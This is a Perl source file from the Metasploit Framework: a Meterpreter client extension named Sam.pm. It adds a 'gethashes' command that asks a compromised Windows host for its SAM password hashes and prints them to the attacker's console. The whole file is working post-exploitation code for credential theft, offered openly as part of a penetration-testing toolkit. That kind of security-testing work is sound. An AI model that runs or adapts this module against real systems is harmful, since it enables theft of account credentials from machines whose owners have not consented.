###############
##
#
#    Name: Sam.pm
#  Author: Vinnie Liu <vinnie [at] metasploit.com>
# Version: $Revision: 1.0 $
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      This module dumps the password hashes from the SAM.
#
##
###############

use strict;
use Pex::Meterpreter::Packet;

package Def;

#
# This is the base index for TLVs inside this extension
#

use constant SAM_BASE                     => 31337;
use constant TLV_TYPE_SAM                 => makeTlv(TLV_META_TYPE_STRING, SAM_BASE +  0);

package Pex::Meterpreter::Extension::Client::Sam;

my $instance = undef;
my @handlers = 
(
	{
		identifier  => "SAM",
		description => "Dumps the SAM password hashes.",
		handler     => undef,
	},
	{
		identifier  => "gethashes",
		description => "Retrieve the password hashes.",
		handler     => \&getHashRequest,
	},
);

#
# Constructor
#
sub new
{
	my $this  = shift;
	my $class = ref($this) || $this;
	my $self  = {};
	my ($client) = @{{@_}}{qw/client/};

	# If the singleton has yet to be created...
	if (not defined($instance))
	{
		bless($self, $class);

		$self->{'client'} = $client;

		$instance = $self;
	}
	else
	{
		$self = $instance;
	}
		
	$self->registerHandlers(client => $client);

	return $self;
}

sub DESTROY
{
	my $self = shift;

	$self->deregisterHandlers(client => $self->{'client'});
}

##
#
# Dispatch registration 
#
##

sub registerHandlers
{
	my $self = shift;
	my ($client) = @{{@_}}{qw/client/};

	foreach my $handler (@handlers)
	{
		$client->registerLocalInputHandler(
				identifier  => $handler->{'identifier'},
				description => $handler->{'description'},
				handler     => $handler->{'handler'});
	}
}

sub deregisterHandlers
{
	my $self = shift;
	my ($client) = @{{@_}}{qw/client/};

	foreach my $handler (@handlers)
	{
		$client->deregisterLocalInputHandler(
				identifier  => $handler->{'identifier'});
	}
}


##
#
# Local dispatch handlers
#
##

#
# Send the request for hashes
#
sub getHashRequest
{
	my ($client, $console, $argumentsScalar) = @{{@_}}{qw/client console parameter/};
	my $request;
	
	# Create the gethashes request
	$request = Pex::Meterpreter::Packet->new(
			type	 => Def::PACKET_TYPE_REQUEST,
			method => "sam_gethashes");
			
	# Transmit
	$client->transmitPacket(
			packet						=> \$request,
			completionHandler => \&getHashComplete);

	return 1;
}

#
# Process the data returned from hash request 
#
sub getHashComplete
{
	my ($client, $console, $packet) = @{{@_}}{qw/client console parameter/};
	my $res = $$packet->getResult();

	if ($res == 0)
	{
		
		my $hashstring = $$packet->getTlv(
				type => Def::TLV_TYPE_STRING);

		$client->writeConsoleOutput(text => 
				"\n");

		if (defined($hashstring))
		{
			$client->writeConsoleOutput(text => 
					"$hashstring");
		}

		$client->printPrompt();

	}
	else
	{

		$client->writeConsoleOutputResponse(
				cmd    => 'gethashes',
				packet => $packet);

	}

	return 1;
}

1;